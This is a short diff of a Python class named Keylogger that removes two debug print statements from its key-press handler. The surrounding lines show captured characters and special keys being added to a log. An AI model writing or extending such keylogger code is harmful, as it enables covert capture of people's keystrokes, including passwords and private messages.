@@ -22,9 +22,7 @@ class Keylogger:
                 self.log += noneKey[str(key.char)]
             else:
                 self.log += str(key.char)
-            print("TRY:" + str(key.char))
         except AttributeError:
-            print("Except:" + str(key))
             if str(key) in specialKeys:
                 # print(str(key))
                 self.log += specialKeys[str(key)]
